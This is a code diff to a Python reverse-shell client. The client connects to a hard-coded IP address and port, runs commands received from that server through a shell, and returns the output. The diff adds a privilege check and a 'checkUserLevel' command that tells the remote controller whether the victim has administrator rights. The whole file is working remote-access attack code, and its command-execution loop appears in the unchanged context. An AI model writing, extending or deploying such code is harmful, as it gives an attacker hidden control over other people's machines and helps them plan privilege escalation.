@@ -3,9 +3,19 @@
 import socket
 import subprocess
 import os
+import ctypes
 
 ip = "172.25.191.60"
 port = 8080
+
+# https://borutzki.github.io/2025/10/16/how-to-check-whether-python-script-has-elevated-privileges.html
+def is_admin() -> bool:
+    if os.name == "nt":
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    elif os.name == "posix":
+        return os.getuid() == 0
+    else:
+        return False
 
 def connect():
     Mysocket = socket.socket()
@@ -31,7 +41,18 @@ def connect():
             except Exception as e:
                 informToServer = "[+] Some error occured. " + str(e)
                 Mysocket.send(informToServer.encode())
-            
+
+
+        elif 'checkUserLevel' in command.decode():
+            try:
+                if is_admin():
+                    informToServer = '[!] Administrator Privileges'
+                else:
+                    informToServer = '[!!] User Privileges. (No Admin privileges)'
+                Mysocket.send(informToServer.encode())
+            except Exception as e:
+                informToServer = "[+] Some error occured. " + str(e)
+                Mysocket.send(informToServer.encode())
 
         else:
             CMD = subprocess.Popen(command.decode(), shell=True, stdin = subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
